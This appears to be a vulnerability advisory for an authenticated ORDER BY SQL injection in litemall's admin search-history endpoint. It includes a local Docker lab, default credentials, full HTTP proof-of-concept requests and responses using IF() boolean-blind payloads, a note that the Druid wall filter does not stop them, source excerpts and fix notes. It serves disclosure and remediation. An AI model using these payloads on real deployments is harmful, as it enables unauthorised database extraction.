### Vulnerability details

**Official website / Product:** https://github.com/linlinjava/litemall

**Repository:** linlinjava/litemall (stars at selection: 20000; confirmed 20401)

**Vulnerability type:** SQLi (CWE-89 — `AdminHistoryController` missing `@Validated`, so `@Sort`/`@Order` whitelist never runs; `sort` flows into `${orderByClause}`)

**Vulnerability versions:** master @ `a1ef964a718b7277925b19ea26afe78ea3a1d325` (docs 1.8.x / project 0.1.0); Docker image `litemall-r51-a5-app:0.1.0` built from that commit

**Vulnerability URL / Parameter:** `GET /admin/history/list` query parameter `sort` (and unchecked `order`)

**Complex:** yes

### Verification procedure

Lab topology:

- Original lab dir: `labs/litemall-r51-a5/` (if cleaned from the tree, rebuild with the compose / build notes below)
- Images: `litemall-r51-a5-app:0.1.0` (built from current source + `eclipse-temurin:8-jre`; removed after audit hygiene — rebuild at the audited commit), `mysql:5.7` (observed 5.7.44)
- Containers: `litemall-r51-a5-app`, `litemall-r51-a5-mysql`
- Ports: app host **127.0.0.1:23105** → container 8080; MySQL host **127.0.0.1:23115** → 3306
- Init SQL: repo `docker/db/init-sql/litemall.sql` (mounted at `/docker-entrypoint-initdb.d/litemall.sql`)
- DB credentials (match official `docker/docker-compose.yml` / `application.yml`): database `litemall`; user `litemall` / `litemall123456`; root `litemall123456`
- Default admin: `admin123` / `admin123`

Reconstructable compose skeleton:

```yaml
services:
  mysql:
    image: mysql:5.7
    container_name: litemall-r51-a5-mysql
    ports: ["23115:3306"]
    environment:
      MYSQL_ROOT_PASSWORD: litemall123456
      MYSQL_DATABASE: litemall
      MYSQL_USER: litemall
      MYSQL_PASSWORD: litemall123456
    command:
      - --character-set-server=utf8mb4
      - --collation-server=utf8mb4_general_ci
      - --default-authentication-plugin=mysql_native_password
    volumes:
      - ./litemall.sql:/docker-entrypoint-initdb.d/litemall.sql
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "127.0.0.1", "-uroot", "-plitemall123456"]
      interval: 5s
      timeout: 5s
      retries: 30
  app:
    image: litemall-r51-a5-app:0.1.0
    container_name: litemall-r51-a5-app
    ports: ["23105:8080"]
    depends_on:
      mysql:
        condition: service_healthy
```

1. Check out `linlinjava/litemall` @ `a1ef964a718b7277925b19ea26afe78ea3a1d325`, package the backend (`litemall-all`) per upstream, build `litemall-r51-a5-app:0.1.0` on `eclipse-temurin:8-jre`; copy `docker/db/init-sql/litemall.sql` into the lab dir and `docker compose up -d`. Wait for an app log line similar to:

```text
litemall-r51-a5-app    | 09:47:01.977 logback [main] INFO  org.linlinjava.litemall.Application - Started Application in 7.363 seconds (JVM running for 7.637)
```

Expected compose bring-up: create network `litemall-r51-a5_default` → create/start mysql → mysql Healthy → start app.

2. Admin login; use returned `token` as both `X-Litemall-Admin-Token` and `JSESSIONID`. Cookies/tokens in the PoC below are lab captures and **must not be replayed** — replace after a fresh login:

```http
POST /admin/auth/login HTTP/1.1
Host: 127.0.0.1:23105
Content-Type: application/json
Accept: application/json

{"username":"admin123","password":"admin123"}
```

Example login response (`data.token` / `Set-Cookie: JSESSIONID` share the same value):

```http
HTTP/1.1 200 
Set-Cookie: JSESSIONID=eddb455d-779b-4237-90fd-6e80357fcea7; Path=/; HttpOnly; SameSite=lax
Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; Expires=Sun, 01-Nov-2026 09:47:11 GMT
vary: accept-encoding
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Mon, 02 Nov 2026 09:47:11 GMT

{"errno":0,"data":{"adminInfo":{"nickName":"admin123","avatar":"https://wpimg.wallstcn.com/f778738c-e4f8-4870-b634-56703b4acafe.gif"},"token":"eddb455d-779b-4237-90fd-6e80357fcea7"},"errmsg":"成功"}
```

3. Seed search-history rows whose id order differs from keyword alphabetical order (matches PoC responses):

```bash
mysql -h127.0.0.1 -P23115 -ulitemall -plitemall123456 litemall <<'SQL'
DELETE FROM litemall_search_history;
INSERT INTO litemall_search_history
  (id, user_id, keyword, `from`, add_time, update_time, deleted) VALUES
  (10, 1, 'zebra', 'wx', '2026-11-02 17:47:45', '2026-11-02 17:47:45', 0),
  (20, 1, 'mango', 'wx', '2026-11-02 17:47:45', '2026-11-02 17:47:45', 0),
  (30, 1, 'apple', 'wx', '2026-11-02 17:47:45', '2026-11-02 17:47:45', 0),
  (40, 1, 'peach', 'wx', '2026-11-02 17:47:45', '2026-11-02 17:47:45', 0),
  (50, 1, 'berry', 'wx', '2026-11-02 17:47:45', '2026-11-02 17:47:45', 0);
SQL
```

4. TRUE: `sort=IF(1=1,id,keyword)&order=asc` → ordered by **id** (10,20,30,40,50 / zebra,mango,apple,peach,berry).
5. FALSE: `sort=IF(1=2,id,keyword)&order=asc` → ordered by **keyword** (30,50,20,40,10 / apple,berry,mango,peach,zebra).
6. Control: same IF payload against `/admin/ad/list` (has class `@Validated`) → `errno=402` (`arg4排序字段不支持`).

### Complete vulnerability PoC

Complete HTTP request (Docker-verified TRUE; replace Token with a fresh login from step 2):

```http
GET /admin/history/list?page=1&limit=10&sort=IF%281%3D1%2Cid%2Ckeyword%29&order=asc HTTP/1.1
Host: 127.0.0.1:23105
User-Agent: curl/8.22.0
Cookie: JSESSIONID=1f65ab66-40d4-4eb2-9186-42dfc1cc5069
X-Litemall-Admin-Token: 1f65ab66-40d4-4eb2-9186-42dfc1cc5069
Accept: application/json

```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 
vary: accept-encoding
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Mon, 02 Nov 2026 09:48:20 GMT

{"errno":0,"data":{"total":5,"pages":1,"limit":10,"page":1,"list":[{"id":10,"userId":1,"keyword":"zebra","from":"wx","addTime":"2026-11-02 17:47:45","updateTime":"2026-11-02 17:47:45","deleted":false},{"id":20,"userId":1,"keyword":"mango","from":"wx","addTime":"2026-11-02 17:47:45","updateTime":"2026-11-02 17:47:45","deleted":false},{"id":30,"userId":1,"keyword":"apple","from":"wx","addTime":"2026-11-02 17:47:45","updateTime":"2026-11-02 17:47:45","deleted":false},{"id":40,"userId":1,"keyword":"peach","from":"wx","addTime":"2026-11-02 17:47:45","updateTime":"2026-11-02 17:47:45","deleted":false},{"id":50,"userId":1,"keyword":"berry","from":"wx","addTime":"2026-11-02 17:47:45","updateTime":"2026-11-02 17:47:45","deleted":false}]},"errmsg":"成功"}
```

FALSE control request:

```http
GET /admin/history/list?page=1&limit=10&sort=IF%281%3D2%2Cid%2Ckeyword%29&order=asc HTTP/1.1
Host: 127.0.0.1:23105
User-Agent: curl/8.22.0
Cookie: JSESSIONID=1f65ab66-40d4-4eb2-9186-42dfc1cc5069
X-Litemall-Admin-Token: 1f65ab66-40d4-4eb2-9186-42dfc1cc5069
Accept: application/json

```

FALSE control response:

```http
HTTP/1.1 200 
vary: accept-encoding
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Mon, 02 Nov 2026 09:48:20 GMT

{"errno":0,"data":{"total":5,"pages":1,"limit":10,"page":1,"list":[{"id":30,"userId":1,"keyword":"apple","from":"wx","addTime":"2026-11-02 17:47:45","updateTime":"2026-11-02 17:47:45","deleted":false},{"id":50,"userId":1,"keyword":"berry","from":"wx","addTime":"2026-11-02 17:47:45","updateTime":"2026-11-02 17:47:45","deleted":false},{"id":20,"userId":1,"keyword":"mango","from":"wx","addTime":"2026-11-02 17:47:45","updateTime":"2026-11-02 17:47:45","deleted":false},{"id":40,"userId":1,"keyword":"peach","from":"wx","addTime":"2026-11-02 17:47:45","updateTime":"2026-11-02 17:47:45","deleted":false},{"id":10,"userId":1,"keyword":"zebra","from":"wx","addTime":"2026-11-02 17:47:45","updateTime":"2026-11-02 17:47:45","deleted":false}]},"errmsg":"成功"}
```

Hardened sibling control: same session, IF payload against `/admin/ad/list`:

```http
GET /admin/ad/list?page=1&limit=10&sort=IF%281%3D1%2Cid%2Cname%29&order=asc HTTP/1.1
Host: 127.0.0.1:23105
User-Agent: curl/8.22.0
Cookie: JSESSIONID=1f65ab66-40d4-4eb2-9186-42dfc1cc5069
X-Litemall-Admin-Token: 1f65ab66-40d4-4eb2-9186-42dfc1cc5069
Accept: application/json

```

```http
HTTP/1.1 200 
vary: accept-encoding
Content-Type: application/json;charset=UTF-8
Transfer-Encoding: chunked
Date: Mon, 02 Nov 2026 09:48:20 GMT

{"errno":402,"errmsg":"arg4排序字段不支持"}
```

Verification result notes:

- TRUE (`IF(1=1,id,keyword)`) returns id ascending: zebra→mango→apple→peach→berry (ids: 10,20,30,40,50).
- FALSE (`IF(1=2,id,keyword)`) returns keyword ascending: apple→berry→mango→peach→zebra (ids: 30,50,20,40,10).
- Control `/admin/ad/list` same IF payload: `errno=402` (排序字段不支持).
- Differential proves MySQL evaluated attacker-controlled `ORDER BY` expressions (boolean blind).
- Requires admin auth (Shiro `authc` + `admin:history:list`); not unauthenticated.
- Default Druid `wall` may block `extractvalue`/`sleep` (logs show `deny function : version` while SQL already contains `order by extractvalue(...)`), but `IF()` boolean ordering still works; wall is not a parameterized fix.

### Vulnerability analysis

Most Admin list controllers combine `@Sort`/`@Order` with class-level `@Validated` so Spring method validation restricts `sort` to a column whitelist (default `add_time`/`id`). `AdminHistoryController` **annotates the parameters but omits class `@Validated`**, so validators never run and raw `sort`/`order` reach:

`LitemallSearchHistoryService` → `setOrderByClause(sort + " " + order)` → Mapper XML `order by ${orderByClause}`.

The same IF payload against `/admin/ad/list` (correct `@Validated`) returns 402, showing this is an **incomplete hardening residual**, not “every admin orderBy is open”.

### Trigger / sink source (full path and line numbers)

```java
# File: litemall-admin-api/src/main/java/org/linlinjava/litemall/admin/web/AdminHistoryController.java
# Lines: 20-39
@RestController
@RequestMapping("/admin/history")
public class AdminHistoryController {
    // NOTE: missing @Validated on class — @Sort/@Order never enforced
    @GetMapping("/list")
    public Object list(String userId, String keyword,
                       @RequestParam(defaultValue = "1") Integer page,
                       @RequestParam(defaultValue = "10") Integer limit,
                       @Sort @RequestParam(defaultValue = "add_time") String sort,
                       @Order @RequestParam(defaultValue = "desc") String order) {
        List<LitemallSearchHistory> historyList = searchHistoryService.querySelective(userId, keyword, page, limit,
                sort, order);
        return ResponseUtil.okList(historyList);
    }
}
```

```java
# File: litemall-db/src/main/java/org/linlinjava/litemall/db/service/LitemallSearchHistoryService.java
# Lines: 50-55
        if (!StringUtils.isEmpty(sort) && !StringUtils.isEmpty(order)) {
            example.setOrderByClause(sort + " " + order);
        }
        PageHelper.startPage(page, size);
        return searchHistoryMapper.selectByExample(example);
```

```xml
# File: litemall-db/src/main/resources/org/linlinjava/litemall/db/dao/LitemallSearchHistoryMapper.xml
# Lines: 105 (and sibling ${orderByClause} sites)
      order by ${orderByClause}
```

Sibling control (whitelist enforced):

```java
# File: litemall-admin-api/src/main/java/org/linlinjava/litemall/admin/web/AdminAdController.java
# Lines: 21-23
@RestController
@RequestMapping("/admin/ad")
@Validated
public class AdminAdController {
```

### Fix notes

1. Add `@Validated` on `AdminHistoryController` (match other Admin controllers).
2. Prefer a service-layer allowlist for sort column/direction; never pass raw HTTP values into `setOrderByClause`.
3. Avoid user-controlled `${orderByClause}` in mappers; map to fixed SQL fragments.
